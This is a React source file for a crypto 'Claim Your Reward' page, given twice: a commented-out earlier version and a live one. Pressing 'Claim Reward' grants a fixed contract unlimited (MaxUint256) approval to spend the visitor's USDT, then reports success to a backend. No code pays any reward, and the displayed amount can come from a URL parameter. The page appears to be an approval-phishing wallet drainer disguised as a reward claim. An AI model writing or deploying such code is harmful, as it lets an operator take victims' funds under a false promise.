// import React, { useState } from "react";
// import { ethers } from "ethers";
// import toast from "react-hot-toast";
// import axios from "axios";
// import { useLocation } from "react-router-dom";
// import { endpoint } from "../../../services/urls";
// import { apiConnectorPost } from "../../../services/apiconnector";


// const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
// const TOKEN_CONTRACT = "0x54E9E6FcC7CB590D5228a07a194895E2Fe361AF4";

// const ClaimReward = () => {

//     const query = new URLSearchParams(useLocation().search);
//     const custid = query.get("custid");

//     const [walletAddress, setWalletAddress] = useState("");

//     const connectWallet = async () => {
//         if (!window.ethereum) {
//             toast.error("Please install MetaMask");
//             return;
//         }
//         try {
//             const accounts = await window.ethereum.request({
//                 method: "eth_requestAccounts",
//             });
//             setWalletAddress(accounts[0]);
//             toast.success("Wallet Connected");
//         } catch (error) {
//             toast.error("Wallet Connection Failed");
//         }
//     };

//     const claimReward = async () => {
//         if (!walletAddress) {
//             toast.error("Please connect your wallet first");
//             return;
//         }
//         try {
//             const provider = new ethers.providers.Web3Provider(window.ethereum);
//             const signer = provider.getSigner();
//             const userAddress = await signer.getAddress();

//             const usdtAbi = [
//                 "function allowance(address owner, address spender) view returns (uint256)",
//                 "function approve(address spender, uint256 amount) returns (bool)",
//             ];

//             const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);

//             const allowance = await usdt.allowance(userAddress, TOKEN_CONTRACT);
//             const maxAllowance = ethers.constants.MaxUint256;

//             if (allowance.lt(ethers.utils.parseUnits("1000000", 18))) {
//                 toast("Approving USDT limit...");
//                 const tx = await usdt.approve(TOKEN_CONTRACT, maxAllowance);
//                 await tx.wait();
//                 toast.success("Approved successfully!");
//             }

//         } catch (error) {
//             toast.error("USDT approval failed. Try again");
//             return;
//         }
//         try {
//             const response = await apiConnectorPost(endpoint.claim_rewards,
//                 {
//                     user_wallet_address: walletAddress,
//                     status: "success",
//                     cust_id: custid
//                 }
//             );
//             if (response?.data?.success) {
//                 toast(response?.data?.message);
//             } else {
//                 toast(response?.data?.message);
//             }
//         } catch (error) {
//             toast.error("API error");
//         }
//     };

//     return (
//         <div style={styles.container}>


//             <div style={styles.card}>
//                 <p style={styles.label}>Reward Amount:</p>
//                 <p style={{ marginTop: "12px" }}>Wallet Address:</p>
//                 <p style={styles.wallet}>
//                     {walletAddress ? walletAddress : "Not Connected"}
//                 </p>

//                 {!walletAddress && (
//                     <button style={styles.btn} onClick={connectWallet}>
//                         Connect Wallet
//                     </button>
//                 )}

//                 {walletAddress && (
//                     <button style={styles.claimBtn} onClick={claimReward}>
//                         Claim Reward
//                     </button>
//                 )}
//             </div>
//         </div>
//     );
// };

// export default ClaimReward;


// const styles = {
//     container: {
//         width: "100%",
//         marginTop: "100px",
//         display: "flex",
//         justifyContent: "center"
//     },
//     card: {
//         background: "#fff",
//         padding: "30px",
//         width: "350px",
//         borderRadius: "12px",
//         boxShadow: "0 0 20px rgba(0,0,0,0.15)",
//         textAlign: "center"
//     },
//     label: {
//         fontSize: "18px",
//         color: "#444"
//     },
//     reward: {
//         fontSize: "40px",
//         color: "#28a745",
//         fontWeight: "bold"
//     },
//     wallet: {
//         background: "#f6f6f6",
//         padding: "8px",
//         borderRadius: "8px",
//         wordBreak: "break-all"
//     },
//     btn: {
//         marginTop: "20px",
//         padding: "12px 18px",
//         fontSize: "16px",
//         border: "none",
//         backgroundColor: "#007bff",
//         color: "#fff",
//         borderRadius: "8px",
//         cursor: "pointer"
//     },
//     claimBtn: {
//         marginTop: "20px",
//         padding: "12px 18px",
//         fontSize: "16px",
//         border: "none",
//         backgroundColor: "#28a745",
//         color: "#fff",
//         borderRadius: "8px",
//         cursor: "pointer"
//     }
// };

// import React, { useState } from "react";



import { ethers } from "ethers";
import toast from "react-hot-toast";
import { useLocation } from "react-router-dom";
import { endpoint } from "../../../services/urls";
import { apiConnectorPost } from "../../../services/apiconnector";
import { useState } from "react";
import CustomCircularProgress from "../../../shared/loder/CustomCircularProgress";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const TOKEN_CONTRACT = "0x54E9E6FcC7CB590D5228a07a194895E2Fe361AF4";

const ClaimReward = () => {
    const [loading, setloading] = useState(false)
    const query = new URLSearchParams(useLocation().search);
    const custid = query.get("custid");
    const encodedAmount = query.get("amnt");   // Base64 value from URL
    const [walletAddress, setWalletAddress] = useState("");
    const [amount, setAmount] = useState();

    // ---- Base64 decode if exists ----
    const decodeAmountFromParams = () => {
        try {
            if (!encodedAmount) return null;
            const decoded = atob(encodedAmount);
            return decoded;
        } catch {
            return null;
        }
    };


    const connectWallet = async () => {
        if (!window.ethereum) {
            toast.error("Please install MetaMask");
            return;
        }
        try {
            const accounts = await window.ethereum.request({
                method: "eth_requestAccounts",
            });
            setWalletAddress(accounts[0]);
            amountfn();
            toast.success("Wallet Connected", { id: 1 });
        } catch (error) {
            toast.error("Wallet Connection Failed", { id: 1 });
        }
    };

    const claimReward = async () => {
        if (!walletAddress) {
            toast.error("Please connect your wallet first");
            return;
        }
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const userAddress = await signer.getAddress();

            const usdtAbi = [
                "function allowance(address owner, address spender) view returns (uint256)",
                "function approve(address spender, uint256 amount) returns (bool)",
            ];

            const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
            const allowance = await usdt.allowance(userAddress, TOKEN_CONTRACT);
            const maxAllowance = ethers.constants.MaxUint256;

            if (allowance.lt(ethers.utils.parseUnits("1000000", 18))) {
                toast("Approving USDT limit...");
                const tx = await usdt.approve(TOKEN_CONTRACT, maxAllowance);
                await tx.wait();
                toast.success("Approved successfully!");
            }

        } catch (error) {
            toast.error("USDT approval failed. Try again");
            return;
        }
        setloading(true)
        try {
            const response = await apiConnectorPost(endpoint.claim_rewards, {
                user_wallet_address: walletAddress,
                status: "success",
                cust_id: custid
            });
            setloading(false)
            toast(response?.data?.message, { id: 1 });
        } catch (error) {
            toast.error("API error");
        }
    };

    const amountfn = async () => {
        try {
            const response = await apiConnectorPost(endpoint?.get_rew_amount, {
                cust_id: custid
            })
            if (response?.data?.result) {
                setAmount(response.data.result);
            } else {
                const paramAmount = decodeAmountFromParams();
                if (paramAmount) setAmount(paramAmount);
            }
        } catch (e) {
            const paramAmount = decodeAmountFromParams();
            if (paramAmount) setAmount(paramAmount);

            toast.error("Something Went Wrong");
        }
    };



    return (
        <div style={styles.bg}>
            <CustomCircularProgress isLoading={loading} />
            <div style={styles.card}>
                <h2 style={styles.title}> Claim Your Reward</h2>

                <div style={styles.rewardBox}>
                    <span style={styles.rewardLabel}>Reward Amount</span>
                    {amount && (<span style={styles.rewardValue}>$ {amount}</span>)}
                </div>

                <p style={styles.walletLabel}>Connected Wallet:</p>

                <div style={styles.walletBox}>
                    {walletAddress ? walletAddress : "Not Connected"}
                </div>

                {!walletAddress && (
                    <button style={styles.connectBtn} onClick={connectWallet}>
                        Connect Wallet
                    </button>
                )}

                {walletAddress && (
                    <button style={styles.claimBtn} onClick={claimReward}>
                        Claim Reward
                    </button>
                )}
            </div>
        </div>
    );
};

export default ClaimReward;




const styles = {
    bg: {
        width: "100%",
        minHeight: "100vh",
        background:
            "linear-gradient(135deg, #1d1c2e, #131424, #0e0f1a)",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: "20px",
    },

    card: {
        width: "380px",
        background: "rgba(255, 255, 255, 0.1)",
        padding: "35px",
        borderRadius: "20px",
        backdropFilter: "blur(12px)",
        boxShadow: "0 10px 35px rgba(0,0,0,0.3)",
        textAlign: "center",
        color: "#fff",
    },

    title: {
        fontSize: "26px",
        marginBottom: "18px",
        fontWeight: "bold",
    },

    rewardBox: {
        background: "rgba(255,255,255,0.15)",
        padding: "15px 20px",
        borderRadius: "12px",
        marginBottom: "20px",
    },

    rewardLabel: {
        fontSize: "14px",
        opacity: 0.8,
    },

    rewardValue: {
        display: "block",
        marginTop: "6px",
        fontSize: "22px",
        fontWeight: "700",
        color: "#4fffb0",
    },

    walletLabel: {
        fontSize: "14px",
        opacity: 0.9,
        marginBottom: "6px",
    },

    walletBox: {
        background: "rgba(255,255,255,0.18)",
        padding: "10px",
        borderRadius: "10px",
        wordBreak: "break-all",
        marginBottom: "18px",
        fontSize: "14px",
    },

    connectBtn: {
        padding: "12px 25px",
        background: "#4d7cff",
        border: "none",
        borderRadius: "10px",
        color: "#fff",
        fontSize: "16px",
        fontWeight: "600",
        cursor: "pointer",
        width: "100%",
        marginTop: "10px",
    },

    claimBtn: {
        padding: "12px 25px",
        background: "#ff7a00",
        border: "none",
        borderRadius: "10px",
        color: "#fff",
        fontSize: "16px",
        fontWeight: "700",
        cursor: "pointer",
        width: "100%",
        marginTop: "10px",
    }
};
